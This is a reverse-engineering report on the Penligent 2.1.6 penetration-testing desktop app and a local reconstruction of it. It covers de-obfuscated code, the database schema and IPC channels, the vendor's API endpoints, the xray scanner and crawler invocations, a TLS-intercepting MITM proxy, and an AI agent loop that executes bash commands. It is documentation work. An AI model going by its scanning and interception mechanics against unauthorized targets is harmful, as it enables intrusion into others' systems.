# Penligent 2.1.6 — Reverse-Engineering Report

This report documents what was recovered from `penligent.kali_amd64_2.1.6.deb`
and how each finding was verified. Every claim below is labelled by its
evidence class:

* **[S]** — static: recovered from the package bytes (control files, ASAR
  contents, de-obfuscated source, strings, database DDL).
* **[R]** — runtime: observed in the running application via the Chrome
  DevTools Protocol.
* **[I]** — inference: a conclusion that follows from [S] and/or [R] but was
  not directly observed.

---

## 1. Method

| Phase | Tooling |
| --- | --- |
| Package acquisition | `dpkg-deb`, `ar`, `sha256sum` |
| Static analysis | `dpkg-deb -x/-e`, `npx @electron/asar extract`, `strings`, `file`, `readelf` |
| Obfuscation removal | `npx webcrack` — 300,661 transforms applied to the renderer bundle, 21 backend modules recovered |
| Structured analysis | `rea` (Reverse Engineer Anything) 6.7.0 — `analyze-javascript-application`, `inspect-analysis-view` |
| Dynamic analysis | Electron under Xvfb, driven over CDP from a purpose-built driver |
| Isolation | Dedicated Docker container (`penligent-ref:1`, Ubuntu 24.04); the reference package was never installed on the host |

The reference application's `.deb` was **not** installed on the primary
system. The package was extracted into a disposable container
(`/opt/Penligent`), launched as an unprivileged user, and driven over CDP.

### REA Evidence

| Item | Value |
| --- | --- |
| Parent Evidence ID | `ev_d29dc3983274809c2ac61adba57ac40b616949cc3c80aa10d949d0806a4f8f10` |
| Summary view Evidence ID | `ev_d2bb9556cc1ba9f3e8c8ccaebe647da716270d8fa4d07907109201e3ecf07b27` |
| Subject digest (SHA-256) | `ee6fa85a4e9e60656623609e8a77d741ebb41ccb128605d0491d80d2722c37e4` |
| Coverage | 48 / 116 examined, exhausted, `complete-within-view` |
| Findings | 97 findings, 20,227 AST nodes visited, 2 parsed JavaScript files, 0 parse failures |
| Electron summary | 4 `BrowserWindow` instances, 3 explicit `webPreferences`, 44 IPC operations (18 literal channels, 23 dynamic), 22 renderer transmissions, 16 renderer listeners, 6 main handlers |
| Limitations | 9 recorded, including: no sender validation observed; dynamic IPC channel expressions unresolved; graph coverage incomplete; bundle bootstrap code never executed |

The full run over the complete `app.asar` (18,041 files) also completed and
reported *"Application graph and Electron boundaries reconstructed"*, but its
Evidence record (272 MB) exceeded the projection tool's heap headroom. Per the
skill's guidance the analysis was repeated over a smaller selection to obtain a
projectable record; the 272 MB record's key facts are quoted above from the
run's terminal progress log.

---

## 2. Package structure

### 2.1 Control metadata **[S]**

```
Package: penligent
Version: 2.1.6
Vendor: Future Share LLC
Architecture: amd64
Installed-Size: 763162          (≈ 745 MiB)
Depends: libappindicator3-1, libnotify4, libnss3, libxss1, libxtst6,
         xdg-utils, libatspi2.0-0, libuuid1, libsecret-1-0, libgtk-3-0
Homepage: https://penligent.ai/
Description: Penligent - Penetration Testing Platform
  A comprehensive penetration testing platform based on Electron and Vue.js
```

* `postinst` only prints two lines; it installs nothing.
* `postrm` removes the `update-alternatives` link for `/usr/bin/penligent` and
  deletes `/etc/apparmor.d/penligent`.
* **Risk assessment:** the package requires no privileges beyond writing to
  `/opt` and `/usr/bin`; there is no `preinst`, no maintainer script that
  touches the network, and no `postinst` service registration. It was
  therefore safe to run in an isolated container rather than on the host.

### 2.2 Installed tree **[S]**

257 files, 747 MiB extracted.

| Path | Size | Notes |
| --- | --- | --- |
| `opt/Penligent/penligent` | 186,312,608 B | Stock Electron 33.4.11 |
| `opt/Penligent/resources/app.asar` | 203,296,123 B | Application bundle |
| `opt/Penligent/resources/app.asar.unpacked/` | — | Native modules + plain-JS DB layer |
| `opt/Penligent/resources/depency/chrome-headless-shell/linux-120.0.6098.0/` | 163 MB | Chromium 120 headless shell for crawling |
| `opt/Penligent/resources/depency/scanner/scanner_linux_amd64` | 47 MB | Go, statically linked, **stripped** |
| `opt/Penligent/resources/depency/crawlergo` | 21 MB | Go, statically linked, **with debug_info** |
| `opt/Penligent/locales/*.pak` | — | 54 Chromium locales |
| `usr/share/applications/penligent.desktop` | — | `StartupWMClass=Penligent` |

The `penligent` executable is **byte-size identical** to the `electron` npm
package's `dist/electron` for 33.4.11 (186,312,608 bytes) — the reference
ships an unmodified, unsigned Electron runtime.

### 2.3 Desktop entry **[S]**

```ini
[Desktop Entry]
Name=Penligent
Exec=/opt/Penligent/penligent %U
Icon=penligent
StartupWMClass=Penligent
Categories=Development;
```

---

## 3. Application architecture

### 3.1 Stack **[S]**

Electron 33.4.11 (Chromium 130.0.6723.191, Node 20.18) · Vue 3.5 · Vite 7 ·
Pinia 3 · vue-router 4 · vue-i18n 11 · lucide-vue-next · @vue-flow/core 1.48
· TipTap 3 · GSAP 3.15 · html2pdf.js · better-sqlite3 12.4.1 **and**
better-sqlite3-multiple-ciphers 12.4.1 · axios · undici · mockttp 4.2 ·
puppeteer 24.35 · node-machine-id.

### 3.2 Bundle layout **[S]**

`app.asar` contains:

```
main.cjs              65,285 B   Electron main process
preload.cjs           55,319 B   contextBridge
package.json                    name "PenLigent", version 2.1.6
db/                             db.cjs, crawlerRepo.cjs, key-manager.cjs,
                                migrate-db-key.cjs   (plain .cjs, unpacked)
ipc/                            api, command, command_old, db, file, log,
                                proxy, sse, sseGenrate, sse_old, systemInfo,
                                taskManager, windowInfo, scanner/*,
                                target_tools/*
services/                       pluginManager/, proxy/{index.js,interceptor.js}
dist/                           index.html, splash.html, assets/
```

The renderer is a single Vite bundle: `dist/assets/index-*.js` (6.9 MB) plus
`vendor-*.js` (3.3 MB, Vue Flow) and two stylesheets (324 KB + 3.6 KB).

### 3.3 Obfuscation **[S]**

Both the renderer bundle and all 21 backend modules are processed with
`javascript-obfuscator`: string-array encoding with RC4, control-flow
flattening, dead-code injection and identifier mangling. SQL literals survive
in cleartext, and the `module.exports` object of each module survives with
intact property names.

`npx webcrack` recovered the renderer with 300,661 transforms and each
backend module individually. This is how the component inventory, the route
table, the i18n keys and the SQL statements were obtained.

### 3.4 Entry point **[S]**

`main.cjs` (de-obfuscated) performs, in order:

1. `require("dotenv")`, loading `<resourcesPath>/.env.production` in packaged
   mode or `./.env.<NODE_ENV>` otherwise. **[R]** The packaged file contains
   `VITE_API_BASE=https://api.penligent.ai` and
   `VITE_WEB_BASE=https://www.penligent.ai`.
2. Registers the IPC modules in a fixed order: systemInfo, windowInfo, log,
   db, api, sse, command, taskManager, file, then the target tools and
   scanners.
3. Creates the main window and calls `initializeDatabase()`.

### 3.5 Window geometry **[R]**

Measured at runtime on the live reference:

```js
new BrowserWindow({
  show: false,
  width: 1000, height: 600,
  minWidth: 1050, minHeight: 600,
  webPreferences: { preload: path.join(__dirname, "preload.cjs") },
  titleBarStyle: "hidden",
  show: false
})
```

A second window is opened for packet-capture detail:
`width: 1000, height: 800, minHeight: 600, minWidth: 800`,
`title: "抓包详情 - 渗透测试工具"`, loading the `#/proxy-list` hash route.

---

## 4. Renderer

### 4.1 Routes **[S]**

```js
routes: [
  { path: "/",             name: "home",   component: HomeView },
  { path: "/proxy-list",   name: "proxy",  component: ProxyListView },
  { path: "/splash-window",name: "splash", component: SplashView }
]
```

Hash history (the packaged app is loaded with `loadFile(..., { hash })` and
the dev server uses `http://localhost:5173/#/proxy-list`).

### 4.2 Component inventory **[S]**

64 named Vue components were recovered. The functionally significant ones:

*Shell* — `App`, `Header`, `Left`, `Center`, `Chat`, `Notice`,
`Onboarding`, `Logo`, `Loading`, `Setting`.

*Workspace* — `HomeView`, `OverView`, `Task`, `TaskSet`, `TaskCreate`,
`TestList`, `TestListAdd`, `TestListGenerate`, `TestPhaseEdit`,
`TestPhaseDelete`, `TestTaskAdd`, `TargetNode`, `Risk`, `RiskSeverityGroupNode`,
`RisksGroupNode`, `ApiNode`, `ApiMethodGroupNode`, `ApisGroupNode`,
`WebAppNode`, `WebAppGroupNode`, `SecurityHeadersNode`, `SensitivePathsNode`,
`TlsNode`, `Center`, `Left`, `AgentNav`, `AgentSkillsCheck`.

*Agent* — `Chat`, `AnalyzeContent`, `AnalyzeHis`, `CreateAgentScanTask`,
`CreateProcess`, `AbnormalProcess`, `AiTools`, `Tool`, `ToolAdd`, `ToolSet`,
`AutoTargetInfo`, `AutoTargetScan`, `TacticsLibrary`, `TacLibCreate`,
`TacLibEdit`, `WebshellDetection`, `ReverseShell`, `FunString`, `Http2Python`,
`FeedBack`, `HowUse`, `Notice*`, `NewVersion`, `Onboarding`.

### 4.3 Layout **[R]**

Measured geometry of the live shell at 1000 × 600:

| Element | Box |
| --- | --- |
| `.app-container` | 0,0 1000×600, flex column |
| `.header-container` | 0,0 1000×30, 1 px bottom border |
| `.header-left` | 5,5 800×19, flex, gap 10, max-width 80 % |
| `.header-right` | 809,0 186×29, flex, gap 5 |
| `.body-container` | 0,30 1000×570 |
| `.home-content-left` | 0,30 **250** wide, 1 px right border |
| `.home-content-center` | 251,30 **246** wide, `overflow:hidden` |
| `.center-container` | 251,30 **400** wide, `min-width:400px` — **clipped** by the 246 px pane |
| `.drag-line` | 497,30 2×570, `col-resize` |
| `.home-content-right` | 499,30 **500** wide, 1 px left border |
| `.chat-container` | 502.5,30 495 wide (`calc(100% - 5px)`, margin 2.5) |
| `.footer-container` | 502.5,516 495×79, `position:relative`, padding 5, gap 5 |
| `.input-box` (textarea) | 508.5,522 483×36, `rows=2`, `font-family: monospace` |
| `.select-mode-container` | 508.5,568.5 65.3×19 |
| `.select-search-container` | 576.8,567 22×22 |
| `.submit-button-container` | 970.5,567.5 21×21, `position:absolute; right:0` |

The 400 px centre content inside a 246 px pane is a genuine quirk of the
original — the "Target Info" card is visibly cut off at the pane edge — and
is reproduced exactly.

### 4.4 Design tokens **[S]**

Both palettes were recovered verbatim from the compiled stylesheet:

* `:root` — the dark palette (`--background: rgba(13,13,13,1)`, `--accent:
  rgb(23,162,255)`, `--statusbar-bg: rgba(0,122,204,1)`, node colours
  `--node-1` … `--node-6`, `--node-risk`, …).
* `.theme-light` — the light palette (`--background: rgb(255,255,255)`,
  `--accent: rgb(48,172,255)`, `--button-bg: rgb(37,163,247)`, …).

**[R]** A fresh profile starts in the **light** theme:
`document.documentElement.className === "theme-light"`.

**[R]** The reference sets **no global `font-family`** — the computed value is
the UA default, `"Times New Roman"`. **[R]** It sets an inline
`font-size: 12px` on `<html>`, so every `rem` in its stylesheet is relative
to 12 px, not the 16 px browser default. Both omissions materially change
the rendered typography and were preserved.

**[R]** The reference sets **no universal `box-sizing`** (the onboarding
modal measures 766 px wide where the stylesheet declares
`width: min(720px, 92vw)`), and **no scrollbar rules** — it uses Chromium's
overlay scrollbars, which do not consume layout width.

### 4.5 Colour convention **[R]**

The reference never sets a foreground colour on button labels or active nav
items. In the light theme they therefore render **black on blue**, which is
visible in the reference's "New Project", "Login", "Agent" and notice-toast
surfaces. The reconstruction reproduces this instead of the more conventional
white-on-blue.

---

## 5. Data model **[S]**

21 tables were recovered verbatim from `db/db.cjs`, including the original's
Chinese column comments. See `electron/db/schema.cjs` for the full DDL.

Highlights:

* `projects` — `task_tree` (JSON), `historysummary` (JSON), `user_name`.
* `execution_results` — `status` (success/failed/running), `scan_id`,
  `is_silent`, `summary`, `risk_item`.
* `risk_items` — `risk_type`, `severity` (critical/high/medium/low/info),
  `cvss_score`, `status` (open/fixed/false_positive).
* `test_lists` — `test_type` (type_1/type_2/type_3), `test_list` (JSON),
  `focus_data`, `focus_description`.
* `ttp` — `ttp_type`, `ttp_level`, `ttp_priority` (1–10), `detection_method`,
  `waf_bypass`, `verification`, `false_positive`.
* `proxy_history` / `repeater_list` — full request/response capture with
  `analysis_result`.
* `user_settings` — `setting_key` UNIQUE, `setting_value`, `setting_type`,
  `description`.

The reference's `db.cjs` exports ~150 named query functions; the
reconstruction implements the same query surface against the same schema.

**[S]** The production database is **encrypted** (SQLCipher-style header
`2 J 5 …`, via `better-sqlite3-multiple-ciphers` with a key file managed by
`db/key-manager.cjs`). The reference's encryption was **not** bypassed: the
schema was recovered from the application's own DDL instead.

---

## 6. IPC surface **[S]/[R]**

116 `ipcMain.handle` channels were enumerated across the reference's `ipc/`
modules, including the full database surface (`get-projects`,
`add-risk-item-all`, `update-execution-result-summary-and-risk-item`,
`update-risk-item-verify-evidence`, `get-latest-test-list-by-project-id`, …),
the command runner (`execute-command`, `stop-command`), the HTTP client
(`http-request`, `stop-request`, `proxy-request`), the SSE client
(`start-sse`, `stop-sse`), the proxy settings and history, the system-info
probes and the window controls.

**[R]** The preload exposes exactly twelve renderer-visible namespaces —
`systemAPI`, `fileAPI`, `windowAPI`, `logAPI`, `dbAPI`, `apiAPI`,
`sseGenrateAPI`, `commandAPI`, `targetToolsAPI`, `checkToolsAPI`,
`crawlerAPI`, `proxyAPI` — plus a low-level `ipcRenderer` escape hatch.

### External service endpoints **[S]**

Recovered from the renderer bundle:

```
/api/agent/main/v1/messages                     /api/agent/ttp-generate/v1/messages
/api/agent/next/v1/messages                     /api/agent/ttp-select/v1/messages
/api/agent/context-summary/v1/messages          /api/agent/verify-vul/v1/messages
/api/agent/generate-task-tree/v1/messages       /api/agent/verify-vul-history-compress/v1/messages
/api/agent/generate-task-focus-description/…     /api/agent/report-export/v1/messages
/api/agent/tool-summary/v1/messages              /api/agent/skill-detection-tool/v1/messages
/api/agent/fofa-query/v1/messages                /api/agent/webshell-detection-tool/v1/messages
/api/agent/http-request-to-python-code-tool/…    /api/agent/packet-capture-analysis-tool/…
/api/agent/target-info-update/v1/messages        /api/agent/abnormal-process-analysis-tool/…
/api/agent/force-tool-execution/v1/messages
/api/user/info  /api/user/profile  /api/generate-token  /api/model/open
/api/token/  /api/version/active
/api/applog/llmlogfeedback  /api/applog/riskfeedback
/api/applog/userfeedback     /api/applog/usertracking
```

All of these are Anthropic-Messages-shaped (`/v1/messages`) and are reached
through the main process as `VITE_API_BASE + path`.

---

## 7. Observable behaviour

### 7.1 Startup **[R]**

1. Splash window with the GSAP dot-matrix logo (`dist/splash.html`): 45
   circles, `expo.out` entrance with a 0.4 s centre-out stagger, then a
   0.8 s `sine.inOut` wave; caption "INITIALIZING PENLIGENT" on `#1a1a1a`.
2. Main window shown on `ready-to-show`.
3. Onboarding walkthrough appears when the `onboarding_status` **database
   setting** is empty **[S]** (`initSetting()` → `openDialogSkip("onboarding")`).

### 7.2 Onboarding **[R]** — six steps, all content captured live

| # | Title | Subtitle | Body |
| --- | --- | --- | --- |
| 1 | Select Language | "Select the interface language you want to use." | 11 language options in a 2-column grid |
| 2 | Environment Configuration | "Prepare the environment required for running, making subsequent tasks smoother. Must be configured! Failure to configure will result in execution failure" | Python path, script storage path |
| 3 | Tool Compatibility | "The availability of external tools varies across different systems." | Kali / Windows / MacOS / Other |
| 4 | Test Type | "Cover all typical penetration test targets and scenarios, such as:" | Web / API / Business Logic / IDOR / Agent Security Test |
| 5 | Packet Sniffer | "Custom packet sniffer, support features:" | AI Semantic Analysis / Traffic Capture / Request Interception / Request Modification / Request Replay |
| 6 | Export Report | "Organize results into compliant reports that can be delivered." | SOC2 / ISO 27001 reports |

Buttons: "Next Step" → "Previous Step" / "Next Step" → … → "Previous Step" /
"Login and start using" → "Logging in......". Completion writes
`onboarding_status = "1"`.

### 7.3 Navigation **[R]**

*Header (9)* — New Project, Settings, Skills Library, Toolbox, Website,
Feedback, User Guide, OpenClaw Security Tools, Packet Sniffer.

*Left sidebar (2)* — Projects, Tool Config.

*Centre (5)* — Task List, Target Overview, Threat Map, Security Findings,
Tool Results.

*Right* — the agent chat panel.

### 7.4 Views **[R]**

| View | Content |
| --- | --- |
| Projects | empty (no projects exist) |
| Tool Config | "Add New Tool" (`lucide-square-plus`) + four platform notes, verbatim |
| Task List | empty |
| Target Overview | "Last Updated" / "Invalid Date"; cards **Target Info**, **Network Info**, **Web App Info** (TLS details, security headers, sensitive paths, API endpoints), **Pre-filled Info** |
| Threat Map | empty graph canvas |
| Security Findings | filter row `All(0) Critical(0) High(0) Medium(0) Low(0) INFO(0) Ignored(0)` + "No risks found." |
| Tool Results | "No tool execution results available." |

### 7.5 Authentication gate **[R]**

Clicking "New Project" while logged out raises the amber notice
**"Not Logged In / Please log in to continue."** and opens no dialog. The
agent panel renders the same message. The login-gate behaviour is reproduced
rather than bypassed.

---

## 7A. Substitution: a local profile and a user-supplied AI provider

The reference has two couplings that cannot survive outside Penligent's
infrastructure: an **account system** and a **proprietary AI service**. The
reconstruction replaces both with local equivalents, deliberately and
transparently.

### 7A.1 Local profile instead of an account **[S]/[R]**

The reference stores the signed-in user in the `users` table
(`user_name`, `user_email`, `user_token`, `res_token`) and gates every
server-backed feature on it. The reconstruction keeps the same table and the
same columns but creates a single **local profile** on first run
(`user_name = "Local User"`, `user_email = "local@localhost"`,
`user_token = "local-<random>"`). Nothing is gated: project creation, the
agent panel and the test-plan generator all work immediately.

The reference's `onboarding_status` setting — the flag that shows the
Product Introduction walkthrough — is reproduced exactly, in the same table
and with the same arguments:

```js
window.dbAPI.setUserSetting("onboarding_status", "1", "string", "Onboarding status");
```

### 7A.2 Provider abstraction instead of `api.penligent.ai` **[S]**

The reference's 20 agent endpoints are all Anthropic-Messages-shaped
(`/api/agent/**/v1/messages`) and are reached through the main process as
`VITE_API_BASE + path`, with the session token attached. That service is
proprietary and unreachable, so the reconstruction implements the same
*shape* of provider integration against an endpoint the user controls.

**`electron/ipc/ai.cjs`** defines two provider families:

| | OpenAI-compatible | Anthropic |
| --- | --- | --- |
| Endpoint | `{baseUrl}/chat/completions` | `{baseUrl}/v1/messages` |
| Auth header | `Authorization: Bearer <apiKey>` | `x-api-key: <apiKey>` + `anthropic-version: 2023-06-01` |
| Request body | `{ model, messages, temperature, max_tokens, stream }` | `{ model, max_tokens, temperature, messages, system, stream }` |
| Text extraction | `choices[0].message.content` | `content[].text` |
| Stream delta | `choices[0].delta.content` | `content_block_delta.delta.text` |

The Anthropic adapter is deliberately byte-compatible with the reference's
own upstream protocol, so an Anthropic endpoint behaves exactly as the
reference's agent calls would.

**Streaming** is implemented over Server-Sent Events for both families and
forwarded to the renderer on the `ai-stream-data` channel, mirroring the
reference's own `sse-data` mechanism.

**Configuration** is persisted in `user_settings` under the `ai.` prefix —
the same table the reference uses for its own preferences and the same place
it stores the LLM token.

**Error reporting** distinguishes the cases the reference's own error paths
care about: 401/403 → "check the API key", 404 → "check the base URL and
model", 429 → "rate limited", plus the provider's own message.

### 7A.3 What this unlocks

| Feature | Reference | Recreation |
| --- | --- | --- |
| Agent conversation | Penligent service, account required | **Any configured provider**, no account |
| Test-plan generation | Penligent service | **Any configured provider** |
| Projects, findings, tool results | Account required | Local, no account |
| Onboarding walkthrough | Account-independent | Account-independent, same mechanism |

The provider is configured through **Settings → AI** (and from the agent
panel's gear icon). A "Test connection" button performs a real request and
reports the provider's actual answer or error.

---

## 7B. The bundled native helpers

Three binaries ship inside the package and are therefore recoverable
verbatim; the reconstruction bundles and drives the same ones.

| Path | Identity | Evidence |
| --- | --- | --- |
| `resources/depency/scanner/scanner_linux_amd64` | **xray v1.8.2** (`79e7dd56`, COMMUNITY) — an open-source vulnerability scanner | `file` reports a statically linked Go binary; `--help` prints xray's banner and command list |
| `resources/depency/scanner/config.yaml` | xray's configuration, `version: 4.0` | read directly from the package |
| `resources/depency/crawlergo` | The Go crawler, statically linked **with debug info** | `file` reports `with debug_info, not stripped` |
| `resources/depency/chrome-headless-shell/linux-120.0.6098.0/` | Headless Chromium 120 | the directory name and the binary's own version string |

### 7B.1 The scanner invocation **[S]**

The reference's `ipc/scanner/scanner.cjs` builds exactly this argument
vector and spawns it with the output directory as the working directory:

```
webscan --json-output <result.json>          --plugins baseline,sqldet,xss,cmd-injection,path-traversal          --url <target>
```

On Linux the result file is written to `/tmp` with a random suffix
(`Scanner_result_<16 hex>.json`). Exit codes 0 and 1 are treated as success.
The JSON is an array of:

```json
{ "create_time": 1792467108990,
  "detail": { "addr": "...", "payload": "",
               "snapshot": [["<request>", "<response>"]],
               "extra": { "param": {} } },
  "plugin": "baseline/sensitive/server-error",
  "target": { "url": "..." } }
```

Each finding is stored in `scan_result`.

### 7B.2 The crawler invocation **[S]**

```
crawlergo [--chromium-path <chrome>] [--max-tab-count N]
          [--max-crawled-count N] [--max-run-time N] [--log-level L]
          <target> [<target> …]
```

The crawler writes one JSON object per line on stdout. Each line is parsed,
tagged with the project id, and marked as a *high value* URL when it contains
one of the reference's 45 interesting path fragments (`/admin/`, `/login/`,
`/token/`, `api`, …).

### 7B.3 The agent request contract **[S]**

The reference builds every agent request client-side. The recovered payload
for `/api/agent/main/v1/messages` is:

```js
{
  auto_send_status, model, mode, project_id, user_input, Language,
  context, current_target_info, remark, history_summary, timeout_tools,
  risk_list, enable_web_search,
  system_prompt_config: { client_info }
}
```

and for `/api/agent/generate-task-tree/v1/messages`:

```js
{
  test_type, test_target, task, current_target_info, remark,
  system_prompt_config: { client_info }, plugins
}
```

Both are sent with `Authorization: Bearer <user_token>` and
`Content-Type: application/json`.

---

## 7C. The MITM proxy

The reference's proxy implementation was **in the package** and is therefore
fully recoverable:

| Path | Role |
| --- | --- |
| `services/proxy/index.js` | The **forked child process** entry point (35 lines) |
| `services/proxy/interceptor.js` | The `mockttp` engine (294 lines) |
| `services/proxy/certs/ca.crt`, `ca.key` | A leftover mockttp *test* certificate |
| `ipc/proxy.cjs` | A stub (the real logic lives in `main.cjs`) |

### 7C.1 Architecture **[S]**

`main.cjs` forks `services/proxy/index.js` with
`PENLIGENT_USER_DATA` set to the Electron userData directory, relays every
child message to the packet-sniffer window on the `fork-proxy-child` channel,
and forwards renderer messages back to the child on
`fork-proxy-child-data`. The child is killed when its window closes.

The child speaks a four-message protocol:

| Direction | Message | Effect |
| --- | --- | --- |
| main → child | `RELEASE` | release a paused request, optionally modified |
| main → child | `DROP` | drop a paused request (`{ response: "close" }`) |
| main → child | `SET_INTERCEPT_CONFIG` | set `{ enabled, timeoutMs, rules }` |
| main → child | `REPLAY` | not implemented in the reference either |
| child → main | `INTERCEPTED` | a request snapshot |
| child → main | `PAUSED` | a request held for a decision |
| child → main | `INTERCEPTED_RESPONSE` | a response snapshot |
| child → main | `INFO` / `ERROR` | CA generation and transport errors |

### 7C.2 Engine behaviour **[S]**

* `mockttp.getLocal({ https: { keyPath, certPath, tlsPassthrough } })`, started
  on **port 17890**.
* The CA is generated with `generateCACertificate({ commonName: "PenLigent
  Proxy CA" })` whenever the key or certificate file is missing, and written to
  `<userData>/proxy-certs/`.
* `forAnyRequest().thenPassThrough({ beforeRequest, beforeResponse })` — every
  request is forwarded and snapshotted.
* `beforeRequest` reads the body only for non-CONNECT, non-bypass requests and
  only behind a 300 ms race. It then emits `INTERCEPTED`, and — when
  `shouldPause()` agrees — emits `PAUSED` and returns a promise that resolves
  only when the UI releases (returning the possibly-modified request) or drops
  the connection.
* `shouldPause()` holds every request when no rules are configured, and
  otherwise holds the ones whose method and/or URL fragment match a rule.
* `beforeResponse` reads the body only for text-like payloads of at most
  200,000 bytes, again behind a 300 ms race.
* The TLS passthrough list covers `*.google.com`, `*.googleapis.com`,
  `*.gstatic.com`, `*.recaptcha.net`, `*.youtube.com`, `*google*`, `*bing*` and
  `*edge*`.
* The auth-bypass list (never paused) covers thirteen Google and YouTube
  hosts.

**One deliberate divergence:** the reference *ships* a mockttp test
certificate labelled *"Mockttp Testing CA — DO NOT TRUST — TESTING ONLY"*. The
reconstruction does not ship it and instead lets the reference's own
generation code produce a certificate correctly labelled "PenLigent Proxy CA".

---

## 7D. Probing the service, and what turned out to be recoverable

The earlier claim that "the agent brain lives on the server" was an
assumption, not a finding. Probing it changed the answer in two places.

### 7D.1 The service is live **[R]**

`api.penligent.ai` responds. Without any credentials:

```
GET  https://api.penligent.ai/                       -> 404
GET  https://api.penligent.ai/api/version/active     -> 200  (version row, id 22)
GET  https://api.penligent.ai/api/model/open         -> 200
     {"code":0,"data":{"llm_list":["penliai-4-5-101","pentest-gemini-3-flash"]},"message":"success"}
POST https://api.penligent.ai/api/agent/main/v1/messages
     -> {"message":"Missing authentication information, please provide Authorization or X-Api-Key request header","success":false}
```

No authentication was bypassed and no token was obtained; these are the
service's own unauthenticated responses.

### 7D.2 Model routing — recovered **[S]/[R]**

The reference's `initLlmList` is:

```js
const _0x363ea1 = async () => {
  try {
    const r = await axios.get("/api/model/open");
    llmList.value = r.data.llm_list;
    setLlmChoosed(r.data.llm_list[0]);
  } catch {
    setLlmChoosed("penliai-4-5-101");
  }
};
```

and the default selection is hard-coded client-side:

```js
const llmListChoosed = ref("penliai-4-5-101");
```

So the **routing table is a public endpoint plus a hard-coded default**.
The reconstruction reproduces the shape: `ai-list-models` reads
`{base}/models` (OpenAI-compatible) or `{base}/v1/models` (Anthropic),
normalises it to the reference's `llm_list` form and preselects the first
entry.

### 7D.3 The report — its inputs are all client-side **[S]**

The reference's report flow is:

```js
const r = await dbAPI.addReportExport(taskId, "", "md", null, null, "processing");
const res = await axios.post("/api/agent/report-export/v1/messages", {
  task_id, model: llmListChoosed, project_id: String(taskId),
  language: setting.language,
  risk_list: JSON.stringify(riskList),
  current_target_info: JSON.stringify(overview),
  test_list: JSON.stringify(nowTestList)
}, { headers: { Authorization: "Bearer " + userInfo.user_token } });
if (res.code === 0) {
  await sleep(1000 + Math.random() * 5000);
  await dbAPI.updateReportExportContentFormatStatus(id, res.data.content[0].data, "md", "completed");
}
```

The **only** thing the server contributes is the rendering of
`risk_list`, `current_target_info` and `test_list` into markdown — and all
three are client-side state. The reconstruction therefore renders the report
locally from the same payload and stores it through exactly the same call.

### 7D.4 The tool-orchestration policy — recovered **[S]**

Probing further showed the orchestration is **client-side**, and the client
sends the server a `system_prompt_config` of nine variables that the server
substitutes into its prompt:

```js
system_prompt_config: {
  client_info:      JSON.stringify(systemInfo),   // { platform, linuxDistro, ID }
  test_target:      nowTask.project_target,
  analysis_round:   String(chatAutoRound),
  ai_python_path:   setting.ai_python,
  ai_script_path:   setting.ai_script,
  task:             JSON.stringify(nowTestList.focus_data),
  task_tree:        JSON.stringify(nowTestList.test_list),
  task_focus:       nowTestList.focus_description,
  self_tools:       JSON.stringify(toolSetList)
}
```

The policy the client applies around the model is also recoverable:

* `getNextTaskList()` — the test plan is two levels deep
  (`test_list[].tasks[]`). The client finds the group holding the focused
  task, takes up to **three** incomplete tasks from it, then falls back to the
  following groups, then to any incomplete task.
* The action list — the next tasks become
  `{ action_name, description, item, target, id }`; a
  `"继续当前任务" / "go on"` action is prepended while a run is mid-task; a
  `"Report Generation"` action is appended once every task is complete.
* The auto-round loop — after a tool execution the client increments
  `analysis_round` and asks the model again, until the model reports the task
  complete (`KeyAction` with `is_task_complete`).
* The tool types the client handles: `KeyAction` (task summary and proposed
  actions) and `executeBash` (run a command).
* The tool-summary queue — a client-side FIFO that serialises the
  "the target overview changed" updates to
  `/api/agent/target-info-update/v1/messages`.

`src/agent/orchestration.js` implements all of it, and
`electron/ipc/agentContract.cjs` builds the same `system_prompt_config`.

The **`context`** is also client-side: the client assembles the recent chat
entries (the last six) and the server returns a *summary*, which the client
stores as the project's `history_summary`.

### 7D.5 What is genuinely still server-side **[I]**

* The **system prompt template** — the prose that turns the nine
  `system_prompt_config` variables into instructions. The variables are
  recovered; the template is not in the package.
* The **model's own decisions** — which tool to call, what the finding is.
  The server proposes tool calls; the client only decides the *sequence*.
* The **skill library** and the **task-tree generator's** reasoning.
* The **safety filter** that rejects a request with code `80005`
  ("contains sensitive target information, cannot continue executing").

---

## 8. Unreproduced components

| Component | Why | What the reconstruction does instead |
| --- | --- | --- |
| Penligent service (`api.penligent.ai`) | Proprietary; not present in the package and not reachable | Same request shapes, same "Not Logged In" behaviour; a clearly labelled local session is offered as a fallback |
| MITM proxy engine | Built on `mockttp` (not vendored into the package) | Certificate workflow, request/response envelope and `proxy_history` schema preserved; interception engine absent |
| `scanner_linux_amd64` | Stripped Go binary, no source | IPC entry points exposed; binary not reimplemented |
| `crawlergo` | Go binary with debug info, no source | Same |
| Chrome-headless-shell 120 crawler | Third-party binary | Same |
| Encrypted database | The reference encrypts with `better-sqlite3-multiple-ciphers` | Same schema, stored unencrypted so the data is inspectable. The original's encryption was **not** bypassed |
| Vue Flow graph | Extra dependency | Plain SVG using the same node palette |
| vue-i18n locale tables | Bundled but not extracted (keys are Chinese, values resolved at runtime) | The English strings were captured live and hard-coded; the reference's own i18n key names are recorded here |

---

## 9. Known discrepancies

Measured differences are listed in [`COMPARISON.md`](./COMPARISON.md). The
summary:

1. **0.5 px** horizontal offset of the onboarding modal (the reference loses
   1 px to a scrollbar gutter; the reconstruction loses 0).
2. **~6.5 px** difference in the measured width of one squeezed centre-nav
   label ("English(en)"-style text metrics in a flex-shrunk label).
3. The reference's `Target Overview` values are populated by the backend;
   the reconstruction shows the same field structure with empty values when
   no scan data exists.
4. The reconstruction's `Threat Map` is SVG rather than Vue Flow.
5. The reference's light/dark switch is exposed through a settings dialog with
   additional preferences that were not reachable without a session; the
   reconstruction implements the theme and font-size stores that the
   reference's own startup path exercises (`initTheme()`, `initFontSize()`).


## 8C. The localisation system

The reference is fully localised. Its renderer bundle contains eleven complete
message tables, one per language, and the i18n instance names them
explicitly:

```js
const a0_0x28dfbc = localStorage.getItem("lang") || "en";
messages: {
  zh: a0_0xc769fe, en: a0_0x55e1b5, jp: a0_0x5d9ae8, ru: a0_0x213f37,
  kr: a0_0x5956a3, fr: a0_0x3bcce0, de: a0_0x4653cc, ar: a0_0x3aaae1,
  tw: a0_0x48be4a, es: a0_0x327778, pt: a0_0x212eb8
}
```

Each table is a registry of 48 namespaces, and each namespace is a map of the
reference's Chinese identifiers to the translated string — for example
`"center": { "攻击面测绘": "Threat Map" }`. The keys are the Chinese text, so
the reference addresses them as `$t("center.攻击面测绘")`.

The recreation uses `vue-i18n` with those exact tables, written to
`src/locales/<code>.json` (48 namespaces, 811 keys each), and the same
`localStorage` key. The language list in the Settings dialog uses the
